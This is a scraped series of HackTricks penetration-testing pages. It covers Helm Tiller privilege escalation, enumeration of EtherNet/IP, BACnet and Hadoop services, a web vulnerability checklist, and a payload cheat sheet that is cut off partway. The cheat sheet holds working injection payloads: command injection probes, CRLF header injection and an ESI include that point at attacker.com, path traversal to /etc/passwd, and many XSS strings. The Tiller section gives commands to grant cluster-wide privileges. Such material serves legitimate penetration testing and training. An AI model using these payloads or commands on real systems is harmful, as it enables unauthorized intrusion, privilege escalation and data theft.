see\nthe installation guide\n.\nThen, you can\nenumerate the service\n:\nhelm --host tiller-deploy.kube-system:44134 version\nPrivilege Escalation\nBy default\nHelm2\nwas installed in the\nnamespace kube-system\nwith\nhigh privileges\n, so if you find the service and has access to it, this could allow you to\nescalate privileges\n.\nAll you need to do is to install a package like this one:\nhttps://github.com/Ruil1n/helm-tiller-pwn\nthat will give the\ndefault service token access to everything in the whole cluster.\ngit clone https://github.com/Ruil1n/helm-tiller-pwn\nhelm --host tiller-deploy.kube-system:44134 install --name pwnchart helm-tiller-pwn\n/pwnchart\nIn\nhttp://rui0.cn/archives/1573\nyou have the\nexplanation of the attack\n, but basically, if you read the files\nclusterrole.yaml\nand\nclusterrolebinding.yaml\ninside\nhelm-tiller-pwn/pwnchart/templates/\nyou can see how\nall the privileges are being given to the default token\n.\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n27017,27018 - Pentesting MongoDB\nNext\n- Network Services Pentesting\n44818/UDP/TCP - Pentesting EthernetIP\nLast modified\n6mo ago"
    },
    {
        "title": "44818/UDP/TCP - Pentesting EthernetIP",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/44818-ethernetip",
        "text": "44818/UDP/TCP - Pentesting EthernetIP\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nProtocol Information\nFrom Wikipedia article on EtherNet/IP\nhttp://en.wikipedia.org/wiki/EtherNet/IP\n‚Äã\nEtherNet/IP was developed in the late 1990s by Rockwell Automation as part of Rockwell's industrial Ethernet networking solutions. Rockwell gave EtherNet/IP its moniker and handed it over to ODVA, which now manages the protocol and assures multi-vendor system interoperability by requiring adherence to established standards whenever new products that utilize the protocol are developed today.\nEtherNet/IP is most commonly used in industrial automation control systems, such as for water processing plants, manufacturing facilities and utilities. Several control system vendors have developed programmable automation controllers and I/O capable of communicating via EtherNet/IP.\nAn EtherNet/IP device is positively identified by querying TCP/44818 with a list Identities Message (0x63). The response messages will determine if it is a EtherNet/IP device and parse the information to enumerate the device.\nFrom\nhere\n‚Äã\nDefault port:\n44818 UDP/TCP\nPORT      STATE SERVICE\n44818/tcp open  EtherNet/IP\nEnumeration\nnmap\n-n\n-sV\n--script\nenip-info\n-p\n44818\n<\nIP\n>\npip3\ninstall\ncpppo\npython3\n-m\ncpppo.server.enip.list_services\n[\n--udp\n]\n[\n--broadcast\n]\n--list-identity\n-a\n<\nIP\n>\nShodan\nport:44818 \"product name\"\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n44134 - Pentesting Tiller (Helm)\nNext\n- Network Services Pentesting\n47808/udp - Pentesting BACNet\nLast modified\n6mo ago"
    },
    {
        "title": "47808/udp - Pentesting BACNet",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/47808-udp-bacnet",
        "text": "47808/udp - Pentesting BACNet\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nProtocol Information\nBACnet\nis a\ncommunications protocol\nfor Building Automation and Control (BAC) networks that leverage the\nASHRAE\n,\nANSI\n, and\nISO\n16484-5 standard\n[1]\nprotocol.\nBACnet was designed to allow communication of\nbuilding automation\nand control systems for applications such as heating, ventilating, and air-conditioning control (\nHVAC\n), lighting control, access control, and fire detection systems and their associated equipment. The BACnet protocol provides mechanisms for computerized building automation devices to exchange information, regardless of the particular building service they perform.\nFrom\nWikipedia\n‚Äã\nDefault port:\n47808\nPORT      STATE SERVICE\n47808/udp open  BACNet -- Building Automation and Control NetworksEnumerate\nEnumeration\nManual\npip3\ninstall\nBAC0\nimport\nBAC0\nbbmdIP\n=\n'<IP>:47808'\nbbmdTTL\n=\n900\nbacnet\n=\nBAC0.connect\n(\nbbmdAddress\n=\nbbmdIP,\nbbmdTTL\n=\nbbmdTTL\n)\n#Connect\nbacnet.vendorName.strValue\n#I couldn't find how to obtain the same data as nmap with this library or any other\n#talk me if you know how please\nAutomatic\nnmap\n--script\nbacnet-info --script-args\nfull\n=\nyes\n-sU\n-n\n-sV\n-p\n47808\n<\nIP\n>\nThis script does not attempt to join a BACnet network as a foreign device, it simply sends BACnet requests directly to an IP addressable device.\nShodan\nport:47808 instance\n\"Instance ID\" \"Vendor Name\"\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n44818/UDP/TCP - Pentesting EthernetIP\nNext\n- Network Services Pentesting\n50030,50060,50070,50075,50090 - Pentesting Hadoop\nLast modified\n3mo ago"
    },
    {
        "title": "50030,50060,50070,50075,50090 - Pentesting Hadoop",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/50030-50060-50070-50075-50090-pentesting-hadoop",
        "text": "50030,50060,50070,50075,50090 - Pentesting Hadoop\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nInformation taken from the book\nNetwork Security Assesment 3rd Edition\n‚Äã\nBasic Information\nApache Hadoop is an open source framework supporting the distributed storage and processing of large datasets using computer clusters. Storage is handled by the Hadoop Distributed File System (HDFS) and processing is performed by using MapReduce and other applications (e.g., Apache Storm, Flink, and Spark) via YARN.\nFigure 15-1. Hadoop 2.0 architecture\nYou can query MapReduce and HDFS services by using the Nmap scripts listed in the following table (including details of the default ports). At the time of writing, Metasploit does not support Hadoop.\nScript name\nPort\nPurpose\nhadoop-jobtracker-info\n50030\nRetrieve information from MapReduce job and task tracker services\nhadoop-tasktracker-info\n50060\n‚Äã\nhadoop-namenode-info\n50070\nRetrieve info from HDFS name node\nhadoop-datanode-info\n50075\nRetrieve info from HDFS data node\nhadoop-secondary-namenode-info\n50090\nRetrieve info from HDFS secondary name node\nLightweight Python and Go HDFS clients are available online. Hadoop runs without authentication by default. You can configure HDFS, YARN, and MapReduce services to use Kerberos.\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n47808/udp - Pentesting BACNet\nNext\n- Pentesting Web\nWeb Vulnerabilities Methodology\nLast modified\n6mo ago"
    },
    {
        "title": "Web Vulnerabilities Methodology",
        "url": "https://book.hacktricks.xyz/pentesting-web/web-vulnerabilities-methodology",
        "text": "Web Vulnerabilities Methodology\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nIn every Web Pentest, there are\nseveral hidden and obvious places that might be vulnerable\n. This post is meant to be a checklist to confirm that you have searched for vulnerabilities in all the possible places.\nProxies\nNowadays\nweb\napplications\nusually\nuses\nsome kind of\nintermediary\nproxies\n, those may be (ab)used to exploit vulnerabilities. These vulnerabilities need a vulnerable proxy to be in place, but they usually also need some extra vulnerability in the backend.\n‚Äã\nAbusing hop-by-hop headers\n‚Äã\n‚Äã\nCache Poisoning/Cache Deception\n‚Äã\n‚Äã\nHTTP Request Smuggling\n‚Äã\n‚Äã\nH2C Smuggling\n‚Äã\n‚Äã\nServer Side Inclusion/Edge Side Inclusion\n‚Äã\n‚Äã\nUncovering Cloudflare\n‚Äã\n‚Äã\nXSLT Server Side Injection\n‚Äã\n‚Äã\nProxy / WAF Protections Bypass\n‚Äã\nUser input\nMost of the web applications will\nallow users to input some data that will be processed later.\nDepending on the structure of the data the server is expecting some vulnerabilities may or may not apply.\nReflected Values\nIf the introduced data may somehow be reflected in the response, the page might be vulnerable to several issues.\n‚Äã\nClient Side Template Injection\n‚Äã\n‚Äã\nCommand Injection\n‚Äã\n‚Äã\nCRLF\n‚Äã\n‚Äã\nDangling Markup\n‚Äã\n‚Äã\nFile Inclusion/Path Traversal\n‚Äã\n‚Äã\nOpen Redirect\n‚Äã\n‚Äã\nPrototype Pollution to XSS\n‚Äã\n‚Äã\nServer Side Inclusion/Edge Side Inclusion\n‚Äã\n‚Äã\nServer Side Request Forgery\n‚Äã\n‚Äã\nServer Side Template Injection\n‚Äã\n‚Äã\nReverse Tab Nabbing\n‚Äã\n‚Äã\nXSLT Server Side Injection\n‚Äã\n‚Äã\nXSS\n‚Äã\n‚Äã\nXSSI\n‚Äã\n‚Äã\nXS-Search\n‚Äã\nSome of the mentioned vulnerabilities require special conditions, others just require the content to be reflected. You can find some interesting polygloths to test quickly the vulnerabilities in:\nReflecting Techniques - PoCs and Polygloths CheatSheet\nSearch functionalities\nIf the functionality may be used to search some kind of data inside the backend, maybe you can (ab)use it to search arbitrary data.\n‚Äã\nFile Inclusion/Path Traversal\n‚Äã\n‚Äã\nNoSQL Injection\n‚Äã\n‚Äã\nLDAP Injection\n‚Äã\n‚Äã\nReDoS\n‚Äã\n‚Äã\nSQL Injection\n‚Äã\n‚Äã\nXPATH Injection\n‚Äã\nForms, WebSockets and PostMsgs\nWhen a websocket posts a message or a form allowing users to perform actions vulnerabilities may arise.\n‚Äã\nCross Site Request Forgery\n‚Äã\n‚Äã\nCross-site WebSocket hijacking (CSWSH)\n‚Äã\n‚Äã\nPostMessage Vulnerabilities\n‚Äã\nHTTP Headers\nDepending on the HTTP headers given by the web server some vulnerabilities might be present.\n‚Äã\nClickjacking\n‚Äã\n‚Äã\nContent Security Policy bypass\n‚Äã\n‚Äã\nCookies Hacking\n‚Äã\n‚Äã\nCORS - Misconfigurations & Bypass\n‚Äã\nBypasses\nThere are several specific functionalities where some workarounds might be useful to bypass them\n‚Äã\n2FA/OTP Bypass\n‚Äã\n‚Äã\nBypass Payment Process\n‚Äã\n‚Äã\nCaptcha Bypass\n‚Äã\n‚Äã\nLogin Bypass\n‚Äã\n‚Äã\nRace Condition\n‚Äã\n‚Äã\nRate Limit Bypass\n‚Äã\n‚Äã\nReset Forgotten Password Bypass\n‚Äã\n‚Äã\nRegistration Vulnerabilities\n‚Äã\nStructured objects / Specific functionalities\nSome functionalities will require the\ndata to be structured in a very specific format\n(like a language serialized object or XML). Therefore, it's easier to identify if the application might be vulnerable as it needs to be processing that kind of data.\nSome\nspecific functionalities\nmay be also vulnerable if a\nspecific format of the input is used\n(like Email Header Injections).\n‚Äã\nDeserialization\n‚Äã\n‚Äã\nEmail Header Injection\n‚Äã\n‚Äã\nJWT Vulnerabilities\n‚Äã\n‚Äã\nXML External Entity\n‚Äã\nFiles\nFunctionalities that allow uploading files might be vulnerable to several issues.\nFunctionalities that generate files including user input might execute unexpected code.\nUsers that open files uploaded by users or automatically generated including user input might be compromised.\n‚Äã\nFile Upload\n‚Äã\n‚Äã\nFormula Injection\n‚Äã\n‚Äã\nPDF Injection\n‚Äã\n‚Äã\nServer Side XSS\n‚Äã\nExternal Identity Management\n‚Äã\nOAUTH to Account takeover\n‚Äã\n‚Äã\nSAML Attacks\n‚Äã\nOther Helpful Vulnerabilities\nThese vulnerabilities might help to exploit other vulnerabilities.\n‚Äã\nDomain/Subdomain takeover\n‚Äã\n‚Äã\nIDOR\n‚Äã\n‚Äã\nParameter Pollution\n‚Äã\n‚Äã\nUnicode Normalization vulnerability\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n50030,50060,50070,50075,50090 - Pentesting Hadoop\nNext\nBrowser Extensions\nLast modified\n30d ago"
    },
    {
        "title": "Reflecting Techniques - PoCs and Polygloths CheatSheet",
        "url": "https://book.hacktricks.xyz/pentesting-web/pocs-and-polygloths-cheatsheet",
        "text": "Reflecting Techniques - PoCs and Polygloths CheatSheet\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nThe goal of these PoCs and Polygloths is to give the tester a fast\nsummary\nof vulnerabilities he may exploit if his\ninput is somehow being reflected in the response\n.\nThis\ncheatsheet doesn't propose a comprehensive list of tests for each vulnerability\n, just some basic ones. If you are looking for more comprehensive tests, access each vulnerability proposed.\nYou\nwon't find Content-Type dependant injections like XXE\n, as usually you will try those yourself if you find a request sending xml data. You\nwon't also find database injections\nhere as even if some content might be reflected it depends heavily on the backend DB technology and structure.\nPolygloths list\n{{\n7\n*\n7\n}}[\n7\n*\n7\n]\n1\n;\nsleep$\n{\nIFS\n}\n9\n;\n#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}\n/*\n$\n(\nsleep\n5\n)\n`sleep\n5\n``\n*/-\nsleep\n(\n5\n)\n-\n'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"\n/*\n`\n*/\n%\n0d\n%\n0aLocation\n:\n%\n20http\n:\n//\nattacker\n.\ncom\n%\n3f\n%\n0d\n%\n0aLocation\n:\n%\n0d\n%\n0aContent\n-\nType\n:\ntext\n/\nhtml\n%\n0d\n%\n0aX\n-\nXSS\n-\nProtection\n%\n3a0\n%\n0d\n%\n0a\n%\n0d\n%\n0a\n%\n3Cscript\n%\n3Ealert\n%\n28document\n.\ndomain\n%\n29\n%\n3C\n/\nscript\n%\n3E\n%\n3f\n%\n0D\n%\n0ALocation\n:\n//\nx\n:\n1\n%\n0D\n%\n0AContent\n-\nType\n:\ntext\n/\nhtml\n%\n0D\n%\n0AX\n-\nXSS\n-\nProtection\n%\n3a0\n%\n0D\n%\n0A\n%\n0D\n%\n0A\n%\n3Cscript\n%\n3Ealert\n(\ndocument\n.\ndomain\n)\n%\n3C\n/\nscript\n%\n3E\n%\n0d\n%\n0aContent\n-\nLength\n:\n%\n200\n%\n0d\n%\n0a\n%\n0d\n%\n0aHTTP\n/\n1.1\n%\n20200\n%\n20OK\n%\n0d\n%\n0aContent\n-\nType\n:\n%\n20text\n/\nhtml\n%\n0d\n%\n0aContent\n-\nLength\n:\n%\n2025\n%\n0d\n%\n0a\n%\n0d\n%\n0a\n%\n3Cscript\n%\n3Ealert\n(\n1\n)\n%\n3C\n/\nscript\n%\n3E\n<\nbr\n><\nb\n><\nh1\n>\nTHIS IS AND INJECTED TITLE\n</\nh1\n>\n/\netc\n/\npasswd\n..\n/\n..\n/\n..\n/\n..\n/\n..\n/\n..\n/\netc\n/\nhosts\n..\n\\\n..\n\\\n..\n\\\n..\n\\\n..\n\\\n..\n\\etc\n/\nhosts\n/\netc\n/\nhostname\n..\n/\n..\n/\n..\n/\n..\n/\n..\n/\n..\n/\netc\n/\nhosts\nC\n:\n/\nwindows\n/\nsystem32\n/\ndrivers\n/\netc\n/\nhosts\n..\n/\n..\n/\n..\n/\n..\n/\n..\n/\n..\n/\nwindows\n/\nsystem32\n/\ndrivers\n/\netc\n/\nhosts\n..\n\\\n..\n\\\n..\n\\\n..\n\\\n..\n\\\n..\n\\windows\n/\nsystem32\n/\ndrivers\n/\netc\n/\nhosts\nhttp\n:\n//\nasdasdasdasd\n.\nburpcollab\n.\ncom\n/\nmal\n.\nphp\n\\\\asdasdasdasd\n.\nburpcollab\n.\ncom\n/\nmal\n.\nphp\nwww\n.\nwhitelisted\n.\ncom\nwww\n.\nwhitelisted\n.\ncom\n.\nevil\n.\ncom\nhttps\n:\n//\ngoogle\n.\ncom\n//\ngoogle\n.\ncom\njavascript\n:\nalert\n(\n1\n)\n(\n\\\\w\n*\n)\n+\n$\n([\na\n-\nzA\n-\nZ\n]\n+\n)\n*\n$\n((\na\n+\n)\n+\n)\n+\n$\n<\n!\n--\n#echo var=\"DATE_LOCAL\" --><!--#exec cmd=\"ls\" --><esi:include src=http://attacker.com/>x=<esi:assign name=\"var1\" value=\"'cript'\"/><s<esi:vars name=\"$(var1)\"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name=\"$(var1)\"/>>\n{{\n7\n*\n7\n}}\n$\n{\n7\n*\n7\n}\n<%=\n7\n*\n7\n%>\n$\n{{\n7\n*\n7\n}}\n#{7*7}${{<%[%'\"}}%\\\n<\nxsl\n:\nvalue\n-\nof select\n=\n\"system-property('xsl:version')\"\n/><\nesi\n:\ninclude src\n=\n\"http://10.10.10.10/data/news.xml\"\nstylesheet\n=\n\"http://10.10.10.10//news_template.xsl\"\n></\nesi\n:\ninclude\n>\n\" onclick=alert() a=\"\n'\"\n><\nimg src\n=\nx onerror\n=\nalert\n(\n1\n)\n/>\njavascript\n:\nalert\n()\njavascript\n:\n\"\n/*\n'\n/*\n`\n/*--></\nnoscript\n></\ntitle\n></\ntextarea\n></\nstyle\n></\ntemplate\n></\nnoembed\n></\nscript\n><\nhtml \\\" onmouseover\n=/*&\nlt\n;\nsvg\n/*/\nonload\n=\nalert\n()\n//>\n-->\n'\n\"/></sCript><deTailS open x=\"\n>\n\" ontoggle\n=\n(\nco\\u006efirm\n)\n``\n>\n\">><marquee><img src=x onerror=confirm(1)></marquee>\"\n></\nplaintext\\\n></|\n\\\n><\nplaintext\n/\nonmouseover\n=\nprompt\n(\n1\n)\n><\nscript\n>\nprompt\n(\n1\n)\n</\nscript\n>\n@gmail\n.\ncom\n<\nisindex formaction\n=\njavascript\n:\nalert\n(\n/\nXSS\n/\n)\ntype\n=\nsubmit\n>\n'-->\" ></script><script>alert(1)</script>\"><img/id=\"confirm( 1)\"/alt=\"/\"src=\"/\"onerror=eval(id&%23x29;>'\"><img src=\"\nhttp\n:\n//\ni\n.\nimgur\n.\ncom\n/\nP8mL8\n.\njpg\"\n>\n\" onclick\n=\nalert\n(\n1\n)\n//<\nbutton ‚Äò onclick\n=\nalert\n(\n1\n)\n//>\n*/\nalert\n(\n1\n)\n//\n';alert(String.fromCharCode(88,83,83))//'\n;\nalert\n(\nString\n.\nfromCharCode\n(\n88\n,\n83\n,\n83\n))\n//\n\";alert(String.fromCharCode (88,83,83))//\"\n;\nalert\n(\nString\n.\nfromCharCode\n(\n88\n,\n83\n,\n83\n))\n//--\n></\nSCRIPT\n>\n\"\n>\n'\n><\nSCRIPT\n>\nalert\n(\nString\n.\nfromCharCode\n(\n88\n,\n83\n,\n83\n))\n</\nSCRIPT\n>\n‚Äã\nClient Side Template Injection\n‚Äã\nBasic Tests\n{{7*7}}\n[7*7]\nPolygloths\n{{\n7\n*7\n}}[\n7\n*7\n]\n‚Äã\nCommand Injection\n‚Äã\nBasic Tests\n;\nls\n||\nls\n;\n|\nls\n;\n&&\nls\n;\n&\nls\n;\n%0Als\n`\nls\n`\n$(\nls\n)\nPolygloths\n1\n;\nsleep\n${\nIFS\n}\n9\n;\n#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}\n/*\n$(\nsleep\n5\n)`\nsleep\n5\n``\n*/-sleep\n(\n5\n)\n-'/*\n$(\nsleep\n5\n)\n`\nsleep\n5\n`\n#*/-sleep(5)||'\"||sleep(5)||\"/*\n`\n*/\n‚Äã\nCRLF\n‚Äã\nBasic Tests\n%0d%0aLocation:%20http://attacker.com\n%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E\n%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert\n(\ndocument.domain\n)\n%3C/script%3E\n%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert\n(\n1\n)\n%3C/script%3E\nDangling Markup\nBasic Tests\n<\nbr\n>\n<\nb\n>\n<\nh1\n>\nTHIS IS AND INJECTED TITLE\n</\nh1\n>\n‚Äã\nFile Inclusion/Path Traversal\n‚Äã\nBasic Tests\n/etc/passwd\n..\n/\n..\n/\n..\n/\n..\n/\n..\n/\n..\n/etc/hosts\n..\\..\\..\\..\\..\\..\\\netc/hosts\n/etc/hostname\n..\n/\n..\n/\n..\n/\n..\n/\n..\n/\n..\n/etc/hosts\nC:/windows/system32/drivers/etc/hosts\n..\n/\n..\n/\n..\n/\n..\n/\n..\n/\n..\n/windows/system32/drivers/etc/hosts\n..\\..\\..\\..\\..\\..\\\nwindows/system32/drivers/etc/hosts\nhttp://asdasdasdasd.burpcollab.com/mal.php\n\\\\\nasdasdasdasd.burpcollab.com/mal.php\n‚Äã\nOpen Redirect\n/\nServer Side Request Forgery\n‚Äã\nBasic Tests\nwww.whitelisted.com\nwww.whitelisted.com.evil.com\nhttps://google.com\n//google.com\njavascript:alert\n(\n1\n)\n‚Äã\nReDoS\n‚Äã\nBasic Tests\n(\\\\\nw*\n)\n+$\n([\na-zA-Z\n]\n+\n)\n*$\n((\na+\n)\n+\n)\n+$\n‚Äã\nServer Side Inclusion/Edge Side Inclusion\n‚Äã\nBasic Tests\n<!--#echo var=\"DATE_LOCAL\" -->\n<!--#exec cmd=\"ls\" -->\n<\nesi:\ninclude\nsrc\n=\nhttp://attacker.com/\n>\nx=\n<\nesi:\nassign\nname\n=\n\"\nvar1\n\"\nvalue\n=\n\"'\ncript'\n\"\n/>\n<s\n<\nesi:\nvars\nname\n=\n\"\n$(var1)\n\"\n/>\n>alert(/Chrome%20XSS%20filter%20bypass/);</s\n<\nesi:\nvars\nname\n=\n\"\n$(var1)\n\"\n/>\n>\nPolygloths\n<!--#echo var=\"DATE_LOCAL\" --><!--#exec cmd=\"ls\" -->\n<\nesi:\ninclude\nsrc\n=\nhttp://attacker.com/\n>\nx=\n<\nesi:\nassign\nname\n=\n\"\nvar1\n\"\nvalue\n=\n\"'\ncript'\n\"\n/>\n<s\n<\nesi:\nvars\nname\n=\n\"\n$(var1)\n\"\n/>\n>alert(/Chrome%20XSS%20filter%20bypass/);</s\n<\nesi:\nvars\nname\n=\n\"\n$(var1)\n\"\n/>\n>\n‚Äã\nServer Side Request Forgery\n‚Äã\nThe same tests used for Open Redirect can be used here.\n‚Äã\nServer Side Template Injection\n‚Äã\nBasic Tests\n${{<%[%'\"}}%\\\n{{7*7}}\n${7*7}\n<%= 7*7 %>\n${{7*7}}\n#{7*7}\nPolygloths\n{{\n7\n*\n7\n}}\n$\n{\n7\n*\n7\n}\n<%=\n7\n*\n7\n%>\n$\n{{\n7\n*\n7\n}}\n#{7*7}${{<%[%'\"}}%\\\n‚Äã\nXSLT Server Side Injection\n‚Äã\nBasic 